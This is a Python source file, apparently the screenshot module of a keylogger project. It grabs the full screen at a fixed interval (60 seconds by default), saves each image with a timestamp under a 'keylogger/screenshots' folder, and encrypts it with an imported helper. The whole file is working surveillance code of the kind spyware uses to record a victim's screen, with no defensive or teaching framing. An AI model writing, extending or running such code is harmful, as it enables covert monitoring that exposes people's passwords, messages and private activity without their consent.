import os
import time
from PIL import ImageGrab
from encryption import encrypt_image

SCREENSHOTS_FOLDER = os.path.join("keylogger","screenshots")

# Create the screenshots folder if it doesn't exist
if not os.path.exists(SCREENSHOTS_FOLDER):
    os.makedirs(SCREENSHOTS_FOLDER)
    print(f"Created screenshots folder at: {os.path.abspath(SCREENSHOTS_FOLDER)}")

def take_screenshot():
    """Take a screenshot, save it, and encrypt it."""
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    screenshot_path = os.path.join(SCREENSHOTS_FOLDER, f"screenshot_{timestamp}.png")
    
    # Take the screenshot
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_path)
    
    # Encrypt the screenshot
    encrypted_path = encrypt_image(screenshot_path)
    
    print(f"Screenshot saved and encrypted to: {encrypted_path}")
    return encrypted_path

def start_screenshot_capture(interval=60):
    """Start taking screenshots at regular intervals."""
    while True:
        take_screenshot()
        time.sleep(interval)

if __name__ == "__main__":
    start_screenshot_capture()